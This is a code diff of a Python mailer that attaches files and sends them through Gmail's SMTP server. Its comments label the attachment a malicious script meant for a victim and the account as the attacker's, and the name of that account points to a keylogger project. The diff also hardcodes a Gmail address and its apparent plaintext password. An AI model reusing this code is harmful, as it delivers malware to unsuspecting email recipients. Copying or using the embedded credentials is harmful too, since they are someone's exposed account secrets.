@@ -5,7 +5,6 @@ from email import encoders
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
-from bs4 import BeautifulSoup as bs
 
 # malicious script being sent to victim
 files_to_send = [
@@ -13,33 +12,27 @@ files_to_send = [
 ]
 
 
-def send_mail(email, password, FROM, TO, msg):
+def send_mail(email, password, TO, msg):
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
     server.login(email, password)
-    server.sendmail(FROM, TO, msg.as_string())
+    server.sendmail(email, TO, msg.as_string())
     server.quit()
 
 # change these to attacker email/password
 email = "keyloggtester4@gmail.com"
 password = "Kalibox123?"
 
-
-FROM = "keyloggtester4@gmail.com"
 TO   = "keyloggtester4@gmail.com"
-subject = "Just a subject"
+subject = "subject"
 
-# edit the html field and insert a document to be the body of the email
-msg = MIMEMultipart("alternative")
-msg["From"] = FROM
+# edit the text field and insert a document to be the body of the email
+msg = MIMEMultipart()
+msg["From"] = email
 msg["To"] = TO
 msg["Subject"] = subject
-html = open("mail.html2").read()
-text = bs(html, "html.parser").text
-text_part = MIMEText(text, "plain")
-html_part = MIMEText(html, "html")
-msg.attach(text_part)
-msg.attach(html_part)
+text = ""
+msg.attach(MIMEText(text, "plain"))
 
 for file in files_to_send:
     with open(file, "rb") as f:
@@ -50,4 +43,4 @@ for file in files_to_send:
     attach_part.add_header("Content-Disposition", f"attachment; filename= {file}")
     msg.attach(attach_part)
 
-send_mail(email, password, FROM, TO, msg)
+send_mail(email, password, TO, msg)
